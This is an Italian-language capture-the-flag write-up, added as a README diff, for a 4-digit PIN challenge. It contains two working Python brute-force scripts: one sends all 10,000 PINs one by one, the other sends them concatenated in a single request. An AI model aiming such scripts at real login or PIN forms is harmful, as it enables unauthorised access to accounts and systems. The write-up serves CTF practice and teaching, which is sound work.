@@ -1,0 +1,82 @@
+# PIN Code Challenge - Brute Force Solution
+
+## Descrizione
+Questa challenge consiste nel trovare un PIN di 4 cifre necessario per accedere a un sistema. Il server si trova all'indirizzo:
+
+```
+http://pincode.challs.olicyber.it
+```
+
+Dobbiamo inviare il PIN corretto al server per ottenere la flag.
+
+---
+
+## Strategia di attacco
+Poiché il PIN è composto da **4 cifre numeriche** (`0000` - `9999`), il numero totale di combinazioni possibili è:
+
+```
+10^4 = 10.000 combinazioni
+```
+
+L'approccio più diretto è un **attacco brute-force**, in cui testiamo tutti i possibili PIN fino a trovare quello corretto.
+
+---
+
+## Soluzione adottata
+### Metodo 1: Invio di PIN uno per uno (classico brute-force)
+Una soluzione classica consiste nell'inviare i PIN uno alla volta tramite richieste `POST`:
+
+```python
+import requests
+
+url = "http://pincode.challs.olicyber.it"
+
+for pin in range(10000):  # Genera PIN da 0000 a 9999
+    pin_code = f"{pin:04d}"  # Formatta il PIN come stringa a 4 cifre
+    response = requests.post(url, data={"pincode": pin_code})
+    
+    if "flag{" in response.text:  # Controlla se la risposta contiene la flag
+        print(f"PIN corretto trovato: {pin_code}")
+        print(response.text)
+        break  # Termina il ciclo se trova la flag
+```
+Questo metodo funziona sempre, ma può essere lento perché invia **10.000 richieste**.
+
+---
+
+### Metodo 2: Invio massivo di tutti i PIN in una sola richiesta
+Per ottimizzare il brute-force, possiamo concatenare tutti i PIN in un'unica stringa e inviarli al server in un solo `POST`:
+
+```python
+import requests
+import re
+
+url = "http://pincode.challs.olicyber.it"
+
+# Creiamo una stringa con tutti i PIN concatenati
+payload = ''.join(f'{i:04}' for i in range(10000))
+
+# Invia il payload con tutti i PIN concatenati
+response = requests.post(url, data={'pincode': payload})
+
+# Cerca la flag nella risposta del server
+match = re.search(r'flag\{.*?\}', response.text)
+if match:
+    print(f"Flag trovata: {match.group(0)}")
+else:
+    print("Flag non trovata.")
+```
+
+Se il server accetta questo formato, il metodo è molto più veloce perché riduce il numero di richieste HTTP.
+
+---
+
+## Conclusione
+Abbiamo esplorato due strategie per risolvere la challenge:
+1. **Brute-force classico** (lento, ma affidabile).
+2. **Attacco massivo con input concatenato** (più veloce se il server lo permette).
+
+Se il server accetta la seconda tecnica, possiamo trovare la flag in un'unica richiesta, rendendo l'attacco estremamente efficiente. 🚀
+
+⚠️ **Nota**: Questa tecnica deve essere usata solo in contesti etici, come CTF o test autorizzati.
+
